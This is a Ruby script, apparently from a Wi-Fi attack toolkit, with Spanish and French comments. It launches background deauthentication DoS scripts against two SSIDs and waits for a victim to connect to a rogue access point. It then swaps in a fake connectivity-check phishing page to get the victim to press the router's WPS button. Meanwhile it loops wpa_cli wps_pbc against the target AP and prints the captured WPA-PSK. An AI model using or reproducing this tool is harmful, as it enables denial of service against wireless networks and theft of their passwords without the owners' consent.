#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Salida del programo... limpiando los ficheros... reiniciando las tarjetas por defecto... ESPERA !\e[0m"
sleep 1
`service stop httpd`
sleep 4
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
if File.exist?("hostapd.txt")
`rm -rf *.txt`
`rm -rf dhcpd.conf`
`rm -rf dhcpd.leases`
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
puts "Limpieza de ficheros terminado... reiniciando las tarjetas por defecto y network-manager..."
`ip link set wlan5 down`
`iw dev wlan5 set type managed`
sleep 2
`ip link set wlan5 up`
sleep 4
`killall wpa_supplicant`
`killall sleep`
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
sleep 4
`service start networkmanager`
sleep 5
puts "Bye..."
exit
else
`rm -rf *.pid`
`killall airbase-ng`
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
`rm -rf *.txt`
`rm -rf dhcpd.conf`
`rm -rf dhcpd.leases`
`service start networkmanager`
sleep 5
puts "Bye..."
exit
end
end

class Start
def self.interface
load 'accessdos.rb'
puts "Starting your second wifi-card..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 2
`ip link set #{$cartedos} up`
sleep 4
Start.activeDos
end

def self.activeDos
puts "Active DoS for both SSID 1 will start now..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Start.dosBis
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.dosBis
puts "Active DoS for both SSID 2 will start now..."
dosbis = Thread.new { `bash rundosbis.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve)
Start.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente      
puts "Esperamos el usario... apoya ctrl+c si quieres salir..."
`echo "" > mac3ssid1.txt`
until File.read('hostapd.txt').include?('authenticated')
sleep 1
end
Start.filtreMac
end

def self.filtreMac
File.open("mac1ssid1.txt").readlines.each do |mac1ssid1|
  puts mac1ssid1
$mac1ssid1 = mac1ssid1.chomp
end

File.open("mac2ssid1.txt").readlines.each do |mac2ssid1|
  puts mac2ssid1
$mac2ssid1 = mac2ssid1.chomp
end

File.open("mac3ssid1.txt").readlines.each do |mac3ssid1|
  puts mac3ssid1
$mac3ssid1 = mac3ssid1.chomp
end

if File.read('hostapd.txt').include?($mac1ssid1)
puts "\e[1;32m[*] Usario del SSID 1 conectado\e[0m"
load 'historique.rb'
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
elsif File.read('hostapd.txt').include?($mac2ssid1)
puts "\e[1;32m[*] Usario del SSID 1 conectado\e[0m"
load 'historique.rb'
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
elsif File.read('hostapd.txt').include?($mac3ssid1)
puts "\e[1;32m[*] Usario del SSID 2 conectado\e[0m"
load 'historiquebis.rb'
`rm -rf apmac.txt`
`mv apmacbis.txt apmac.txt`
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$pagebis}.php index.php`
else
puts "\e[1;34m[*] ERROR: no se ha podido encontar el usario\e[0m"
end
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
puts "\e[1;32m[*] Stoping DoS attack...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
Process.kill 15, File.read('/tmp/terminalbis.pid').to_i
`killall xterm`
`killall sleep`
sleep 1
puts "Iniciando wpa_cli con la segunda tarjeta..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 2
`ip link set #{$cartedos} up`
sleep 4
`rfkill unblock all`
sleep 4
       puts "Esperamos por el WPS push boton..."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.1/wpa_supplicant.conf /etc/`
sleep 1;
puts $apmac
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Wps.wpsGrab  
sleep(5000000)
end
end

class Wps
def self.wpsGrab
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] El boton WPS ha sido apoyado, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
end
end
end
